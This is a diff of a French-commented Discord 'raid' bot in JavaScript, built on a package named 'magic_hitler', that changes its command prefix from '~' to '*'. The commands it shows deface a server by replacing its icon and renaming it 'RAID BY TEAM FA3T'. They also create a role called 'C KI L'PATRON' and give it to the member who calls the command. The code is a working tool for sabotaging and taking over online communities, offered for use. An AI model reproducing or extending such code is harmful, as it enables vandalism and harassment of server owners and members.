@@ -3,7 +3,7 @@ const MagicHitler = require('magic_hitler'); // npm i magic_hitler
 const client = new Discord.Client();
 const raid = new MagicHitler.Client({
     client: client,
-    prefix: "~" // Optionnel ; Préfixe pour les commandes
+    prefix: "*" // Optionnel ; Préfixe pour les commandes
 });
  
 raid.ready();
@@ -117,7 +117,7 @@ client.on('message', message => {
 
     // Commandes Raid en plus :
 
-    if(message.content === "~help"){
+    if(message.content === "*help"){
         message.delete()
         let embed = new Discord.RichEmbed()
             .setColor('#E69900')
@@ -127,17 +127,17 @@ client.on('message', message => {
         message.author.send(embed)
     }
 
-    if(message.content === "~guild"){
+    if(message.content === "*guild"){
         message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
         message.guild.setName("RAID BY TEAM FA3T")
     }
 
-    if(message.content === "~raid"){
+    if(message.content === "*raid"){
         message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
         message.guild.setName("RAID BY TEAM FA3T")
     }
 
-    if(message.content === "~cA"){
+    if(message.content === "*cA"){
         let role = message.guild.roles.find(`name`, "C KI L'PATRON");
         message.guild.createRole({
             name: "C KI L'PATRON",
@@ -146,7 +146,7 @@ client.on('message', message => {
         })
     }
 
-    if(message.content === "~a"){
+    if(message.content === "*a"){
         message.member.addRole(`name`, "C KI L'PATRON")
     }
 
